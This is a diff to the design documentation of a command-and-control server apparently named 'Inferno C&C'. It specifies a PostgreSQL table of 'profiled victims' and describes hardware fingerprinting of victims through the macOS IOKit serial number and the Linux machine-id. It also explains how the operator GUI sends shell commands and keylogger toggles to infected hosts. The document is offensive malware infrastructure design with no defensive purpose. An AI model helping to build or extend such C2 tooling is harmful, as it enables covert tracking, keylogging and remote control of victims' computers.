@@ -6,15 +6,26 @@ The Inferno C&C utilizes **PostgreSQL 16** for forensic-compliant, production-gr
 ## 2. Tactical Schema Specification
 
 ### `agents` Table
+
 Stores immutable identity and session metadata for all profiled victims.
 - `id`: SERIAL PRIMARY KEY
-- `uuid`: VARCHAR(64) UNIQUE (IOKit/Machine-ID based)
-- `ip_address`: VARCHAR(45)
+- `uuid`: VARCHAR(64) UNIQUE (Persistent hardware-based fingerprint)
+- `ip_address`: VARCHAR(45) (Volatile last-seen IP)
 - `hostname`: TEXT
 - `os_info`: TEXT
 - `first_seen`: TIMESTAMP
 - `last_seen`: TIMESTAMP
 - `is_online`: BOOLEAN
+
+#### Hardware-Based UUID Fingerprint Generation
+To ensure victim tracking is resilient across disconnections, reboots, and network configuration changes (such as dynamic IP reassignments), the Agent calculates a unique hardware fingerprint:
+* **macOS (Darwin)**: Interrogates the native **IOKit registry** (`kIOMainPortDefault` / `IOPlatformExpertDevice`) to query the platform hardware serial number (`kIOPlatformSerialNumberKey`). This provides an immutable, physical identifier prefixing it as `MAC-<Serial>`.
+* **Linux**: Reads from system descriptor file `/etc/machine-id` (falling back to `/var/lib/dbus/machine-id`). This provides a unique, persistent installation identifier prefixing it as `LINUX-<Machine-ID>`.
+
+#### Persistent UUID Mapping vs Volatile IP Command Routing
+The C2 GUI manages the connection state by decoupling the network addressing from the persistent client row:
+* **Identification & Duplication Prevention**: When an agent connects, the list view searches for an existing item comparing the persistent UUID stored under role `Qt::UserRole + 1`. If found, it updates the existing list item rather than creating a duplicate row.
+* **Network Command Dispatching**: The active connection socket operates using IP address endpoints. When an agent updates or reconnects, the list item updates its stored volatile IP metadata under role `Qt::UserRole`. Operator command clicks (shell commands, keylogger toggles, process refreshes) retrieve this active IP mapping to route packets to the appropriate network descriptor.
 
 ### `telemetry` Table
 Stores historical streams of agent data (Process Lists, Shell Output, System Events).
